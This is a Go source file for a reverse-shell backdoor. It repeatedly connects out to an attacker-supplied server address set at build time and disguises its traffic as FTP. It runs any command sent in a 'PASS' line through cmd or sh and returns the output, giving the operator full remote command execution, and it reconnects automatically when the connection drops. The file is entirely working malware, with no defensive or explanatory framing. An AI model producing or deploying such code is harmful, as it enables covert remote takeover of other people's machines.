package main

import (
    "bufio"
    "fmt"
    "net"
    "os/exec"
    "runtime"
    "strings"
    "time"
)

var (
    serverAddr string
    reconnectDelay = 10 * time.Second
)

func executeCommand(command string) string {
    var cmd *exec.Cmd
    
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd", "/C", command)
    } else {
        cmd = exec.Command("sh", "-c", command)
    }
    
    output, err := cmd.CombinedOutput()
    if err != nil {
        return fmt.Sprintf("Error: %s\n%s", err, output)
    }
    return string(output)
}

func connectToServer() {
    for {
        fmt.Printf("Attempting to connect to %s...\n", serverAddr)
        conn, err := net.Dial("tcp", serverAddr)
        if err != nil {
            fmt.Printf("Connection error: %v. Retrying in %v...\n", err, reconnectDelay)
            time.Sleep(reconnectDelay)
            continue
        }

        fmt.Printf("Successfully connected to %s\n", serverAddr)
        handleConnection(conn)
        conn.Close()
    }
}

func handleConnection(conn net.Conn) {
    defer conn.Close()
    conn.Write([]byte("220 Agent Ready\r\n"))
    
    scanner := bufio.NewScanner(conn)
    for scanner.Scan() {
        text := strings.TrimSpace(scanner.Text())
        
        switch {
        case strings.HasPrefix(text, "USER "):
            conn.Write([]byte("331 User OK\r\n"))
        case strings.HasPrefix(text, "PASS "):
            cmd := strings.TrimPrefix(text, "PASS ")
            output := executeCommand(cmd)
            conn.Write([]byte(fmt.Sprintf("150-Result:\r\n%s\r\n226 Done\r\n", output)))
        case text == "QUIT":
            conn.Write([]byte("221 Bye!\r\n"))
            return
        default:
            conn.Write([]byte("200 OK\r\n"))
        }
    }
}

func main() {
    if serverAddr == "" {
        panic("Server address not specified! Build with -ldflags \"-X main.serverAddr=IP:PORT\"")
    }
    connectToServer()
}
